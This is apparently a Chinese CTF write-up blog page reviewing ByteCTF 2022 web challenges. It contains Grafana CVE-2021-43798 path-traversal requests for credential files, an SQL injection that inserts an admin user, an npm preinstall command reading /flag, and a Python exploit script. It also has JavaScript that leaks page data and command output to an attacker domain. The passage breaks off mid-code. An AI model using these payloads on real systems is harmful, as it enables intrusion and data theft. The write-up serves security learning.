@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=EB Garamond:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link href="https://fonts.googleapis.com/css?family=Noto+Serif+SC|Roboto&display=swap" rel="stylesheet">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="周末和队友一起打了ByteCTF，就打了第一天，第二天睡大觉去了。 字节出的题还是学到了非常多的，现在复盘一下。 这次比赛的好多知识点之前在挖洞&#x2F;刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022ByteCTF复现">
+<meta property="og:url" content="http://example.com/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="The world of whistleH">
+<meta property="og:description" content="周末和队友一起打了ByteCTF，就打了第一天，第二天睡大觉去了。 字节出的题还是学到了非常多的，现在复盘一下。 这次比赛的好多知识点之前在挖洞&#x2F;刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929231352356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929232549876.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145240477.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145402655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171917479.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930170938596.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171127025.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171356476.png">
+<meta property="article:published_time" content="2022-09-29T00:22:50.000Z">
+<meta property="article:modified_time" content="2022-10-18T11:04:11.749Z">
+<meta property="article:author" content="whistle.H">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="ByteCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929231352356.png">
+
+<link rel="canonical" href="http://example.com/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2022ByteCTF复现 | The world of whistleH</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">The world of whistleH</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="whistle.H">
+      <meta itemprop="description" content="天青色等烟雨，而我在等你">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The world of whistleH">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022ByteCTF复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-29 08:22:50" itemprop="dateCreated datePublished" datetime="2022-09-29T08:22:50+08:00">2022-09-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-18 19:04:11" itemprop="dateModified" datetime="2022-10-18T19:04:11+08:00">2022-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/Games/" itemprop="url" rel="index"><span itemprop="name">Games</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/Games/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>周末和队友一起打了ByteCTF，就打了第一天，第二天睡大觉去了。</p>
+<p>字节出的题还是学到了非常多的，现在复盘一下。</p>
+<p>这次比赛的好多知识点之前在挖洞/刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。 <span id="more"></span> ## web</p>
+<h3 id="grafana">grafana</h3>
+<h4 id="解题复盘">解题复盘</h4>
+<p>这题是一个经典的框架题，grafana是一个可视化的web应用，打开页面发现是一个注册框。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929231352356.png" alt="image-20220929231352356" style="zoom:50%;" /></p>
+<p>重点是底下的信息，尤其是版本，尝试搜索一下，发现该版本存在任意文件读取漏洞。</p>
+<p>尤其是该漏洞不需要登录权限，基本上可以猜测需要利用这个CVE读取配置文件，从而实现登录。</p>
+<p>https://github.com/jas502n/Grafana-CVE-2021-43798</p>
+<p>https://xz.aliyun.com/t/10647</p>
+<p>重点是读取grafana.db和grafana.ini读取到密文以及密钥，从而解密密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /public/plugins/text/#/../../../../../../../../../var/lib/grafana/grafana.db</span><br><span class="line">GET /public/plugins/text/#/../../../../../../../../../etc/grafana/grafana.ini</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，这里要绕过nginx反向代理，使用#来绕过。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929232549876.png" alt="image-20220929232549876" style="zoom:50%;" /></p>
+<p>获取到这两个文件后，直接利用github上的现成exp解决。</p>
+<h4 id="我的总结">我的总结</h4>
+<p>这道题的解题思路是比较简单的，网上有非常多关于CVE-2021-43798的博客，我的问题在于没能及时解决Nginx反向代理的问题，从而卡在了400报错，之前在渗透测试的时候就遇到了类似的问题，当时没有深究，比赛的时候就麻爪了。</p>
+<p>同时GitHub上的脚本也非常多，以后面对这种CVE，可以多看看Github上的exp，往往出题人就是对着这些exp的攻击思路来出题的。</p>
+<h3 id="ctf-cloud">ctf-cloud</h3>
+<h4 id="解题复盘-1">解题复盘</h4>
+<p>这题两个点，首先是获取admin权限，其次是利用preinstll的特性来实现文件读取。</p>
+<p>首先审计源代码，查看<code>routers/user.js</code></p>
+<p>注入点直接拼接了字符串而不是用占位符预编译，因此我们构造如下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;123&#x27;,0),(&#x27;admin&#x27;,&#x27;123456&#x27;,1);#-- -</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/1.png" alt="1" style="zoom: 50%;" /></p>
+<p>获取了admin的权限，进入工作页面。</p>
+<p>首先构造带有漏洞的包（这里的上传路径我们是不知道的，可以先上传一个文件看看）。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;myapp&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;exp&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;preinstall&quot;</span>: <span class="string">&quot;cat /flag &gt; /usr/local/app/public/app/public/uploads/c.txt&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将对应的文件夹压缩为.tar格式（也可以使用git远程加载）</p>
+<p>上传.tar文件包，需要注意的是，它原生的上传接口写得有问题，没办法传送文件，建议使用Python编程来实现。</p>
+<p>上传dependencies的json，直接也使用Python编程一把过了。</p>
+<p>最后点击编译，读取上传目录下的文件就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://fadd264b400e679694169cd6ba0dff77.2022.capturetheflag.fun&quot;</span></span><br><span class="line"></span><br><span class="line">route0 = <span class="string">&quot;/dashboard/reset&quot;</span></span><br><span class="line">route1 = <span class="string">&quot;/dashboard/upload&quot;</span></span><br><span class="line">route2 = <span class="string">&quot;/dashboard/dependencies&quot;</span></span><br><span class="line">route3 = <span class="string">&quot;/dashboard/run&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;dependencies&#x27;</span> : &#123;</span><br><span class="line">        <span class="string">&#x27;babel-core&#x27;</span>: <span class="string">&#x27;http://127.0.0.1/app/public/uploads/exp.tar&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;connect.sid&quot;</span>:<span class="string">&quot;s%3A6O6RbUoJbSPHrrxssAh-eRrSAm6aFmY7.QDzxD%2BlygrhUNDBJCh1Ckx%2FHVFIToHwb%2BPAR6LrCcj0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># rest package and dependencies</span></span><br><span class="line">response = requests.post(url=url+route0, </span><br><span class="line">                        cookies=cookies,</span><br><span class="line">                        verify=<span class="literal">False</span>,</span><br><span class="line">                        proxies=&#123;</span><br><span class="line">                            <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">                        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># upload package</span></span><br><span class="line">response = requests.post(url=url+route1, </span><br><span class="line">                        cookies=cookies,</span><br><span class="line">                        files=&#123;</span><br><span class="line">                            <span class="string">&quot;exp.tar&quot;</span>:<span class="built_in">open</span>(<span class="string">&#x27;exp.tar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">                        &#125;, </span><br><span class="line">                        verify=<span class="literal">False</span>,</span><br><span class="line">                        proxies=&#123;</span><br><span class="line">                            <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">                        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># upload dependencies</span></span><br><span class="line">response = requests.post(url=url+route2,</span><br><span class="line">                        headers = headers,</span><br><span class="line">                        cookies = cookies,</span><br><span class="line">                        json = data,</span><br><span class="line">                        verify = <span class="literal">False</span>,</span><br><span class="line">                        proxies=&#123;</span><br><span class="line">                            <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">            )</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># run npm install</span></span><br><span class="line">response = requests.post(url=url+route3,</span><br><span class="line">                        cookies = cookies,</span><br><span class="line">                        verify = <span class="literal">False</span>,</span><br><span class="line">                        proxies=&#123;</span><br><span class="line">                            <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">            )</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># read the file</span></span><br><span class="line">filepath = <span class="string">&quot;/app/public/uploads/c.txt&quot;</span></span><br><span class="line">response = requests.get(url = url + filepath,</span><br><span class="line">                        cookies = cookies,</span><br><span class="line">                        )</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+<h4 id="我的总结-1">我的总结</h4>
+<p>比赛时，我主要是发现SQL注入点，但是当时没有第一时间反应过来插入admin这个数据，这样的攻击其实在NepCTF的时候已经遇到过了，当时是利用不可见字符<code>%c2</code>构造新的admin用户。漏洞形成的主要原因还是'admin'不是主键，却充当身份校验值。</p>
+<p>剩下的部分tan大师直接速通了，我是赛后才复盘。</p>
+<p>主要还是我对npm和node.js项目部署的不熟悉，字节的前端还糊弄，搞得我不知道要从何下手，只能说以后慢慢积累经验了。</p>
+<h3 id="typing-game">typing-game</h3>
+<h4 id="解题复盘-2">解题复盘</h4>
+<p>这道题的两个知识点，CSS注入和CORS我之前都有遇到过，但是比赛的时候结合起来的就意识不到了。</p>
+<p>页面点击进去之后，是一个打字游戏。</p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145240477.png" alt="image-20220930145240477" /><figcaption aria-hidden="true">image-20220930145240477</figcaption>
+</figure>
+<p>很明显要输入的单词就是#embed 的mp3文件对应的名字。</p>
+<p>简单打打游戏，基本是过不了关的，于是回头查看源代码。</p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930145402655.png" alt="image-20220930145402655" /><figcaption aria-hidden="true">image-20220930145402655</figcaption>
+</figure>
+<p>源代码中，显示color属性是可控的，因此考虑是不是CSS注入，从而泄露src中的内容，实现游戏的过关。</p>
+<p>还有两个路由：</p>
+<ol type="1">
+<li><code>/status</code>可以实现无回显的短命令执行，但是要求内网访问</li>
+<li><code>/report</code>可以实现对外网资源的访问，可以实现XSS/CSRF</li>
+</ol>
+<p>简单的XSS利用思路是：</p>
+<ol type="1">
+<li><code>report</code>利用<code>url</code>让victim访问hacker的VPS</li>
+<li>在VPS中引入<code>127.0.0.1/status</code></li>
+<li>跨域读取页面中的内容，类似的赛题有GKCTF checkbot</li>
+</ol>
+<p>这样的方法有关键在于开了跨域，如果没开的话，那么受同源策略限制是无法做到的。</p>
+<p>分享一篇同源策略讲得非常清楚的博客：https://www.cnblogs.com/bmjoker/p/9500374.html</p>
+<p>在这道题中，我们要实现让victim主动访问<code>/status</code>路由，这需要XSS的实现，刚好存在name参数可以XSS。</p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171917479.png" alt="image-20220930171917479" /><figcaption aria-hidden="true">image-20220930171917479</figcaption>
+</figure>
+<p>问题转移到如何实现解题（手动显然不可行</p>
+<p>我们尝试闭合CSS，利用CSS注入泄露HTML页面内容实现在hacker端获取到答案</p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930170938596.png" alt="image-20220930170938596" /><figcaption aria-hidden="true">image-20220930170938596</figcaption>
+</figure>
+<p>这样拼接我们能在hacker端获取到对应页面的src值的内容，并且可以通过向hacker端发送请求实现src值的获取。</p>
+<p>接下来实现自动化答题，回归到源代码，我们查看源代码发现存在两种答题模式</p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171127025.png" alt="image-20220930171127025" /><figcaption aria-hidden="true">image-20220930171127025</figcaption>
+</figure>
+<p>于是单次答题的攻击链如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSS注入泄露src -&gt; hacker端接收到对应src -&gt; victim端访问hacker端得到src -&gt; 拼接location.href 答题</span><br></pre></td></tr></table></figure>
+<p>当我们解决了所有问题之后，接下来我们就可以利用name的XSS注入了,<code>after_command</code>就是访问<code>/status</code></p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220930171356476.png" alt="image-20220930171356476" /><figcaption aria-hidden="true">image-20220930171356476</figcaption>
+</figure>
+<p>注意到，此时是victim端访问<code>/status</code>，所以通过内网检查。</p>
+<p>victim端获取到HTML内容，接下来就是发送，这当然也涉及跨域，但是此时注意到hacker端就是响应端了，主动权在hacker端，只要设置响应头就可以了。</p>
+<p>最后在hacker端接受传送过来的<code>/status</code>的结果就可以了。</p>
+<p>hacker端需要部署两个web服务，一个是<code>report</code>访问实现自动化做题，一个是实现接收src和最后的rce结果。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    prevent page recycle</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://deelay.me/50000/https://picsum.photos/200/300&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> after_command =</span></span><br><span class="line"><span class="javascript">        <span class="built_in">encodeURIComponent</span>(</span></span><br><span class="line"><span class="javascript">            <span class="string">`fetch(&#x27;http://127.0.0.1:13002/status?cmd=env&#x27;).then(r=&gt;r.text().then(t=&gt;fetch(&#x27;https://www.hackerdomain.com/ctftest/setword/&#x27;+encodeURIComponent(t))));`</span></span></span><br><span class="line"><span class="javascript">        );</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.location.href.indexOf(<span class="string">&quot;www.hackerdomain.com&quot;</span>) == -<span class="number">1</span>) &#123; <span class="comment">//local testing</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> server = <span class="string">&quot;https://a71f2c55a775f55f23d7ccaf62f36fe0.2022.capturetheflag.fun&quot;</span></span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//打远程</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> server = <span class="string">&quot;http://127.0.0.1:13002&quot;</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> base_url = server + <span class="string">&quot;/?color=red;&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=web]&#123;background-image:url(https://www.hackerdomain.com/ctftest/setword/web);&#125;&quot;</span> + </span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=bytedance]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/bytedance);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=ctf]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/ctf);&#125;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=sing]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/sing);&#125;&quot;</span> +</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=jump]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/jump);&#125;&quot;</span> + </span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=rap]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/rap);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span class="string">&quot;%0a.container%20embed[src^=basketball]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/basketball);&#125;&quot;</span>+</span></span><br><span class="line"><span class="javascript">                            <span 